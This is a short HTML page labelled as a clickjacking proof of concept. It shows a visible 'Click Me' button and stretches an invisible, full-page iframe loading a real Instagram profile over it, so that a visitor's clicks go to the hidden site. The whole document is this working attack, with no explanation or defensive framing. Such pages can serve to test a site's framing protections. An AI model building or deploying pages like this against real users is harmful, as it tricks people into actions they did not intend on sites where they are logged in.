<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Clickjacking PoC</title>
</head>
<body>
  <h2>Clickjack Example</h2>
  <!-- Visible button that the user thinks they are clicking -->
  <button id="realButton" onclick="alert('Button clicked!')">Click Me</button>

  <!-- Invisible iframe positioned over the button -->
  <iframe src="https://www.instagram.com/unthrz" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0;"></iframe>
</body>
</html>
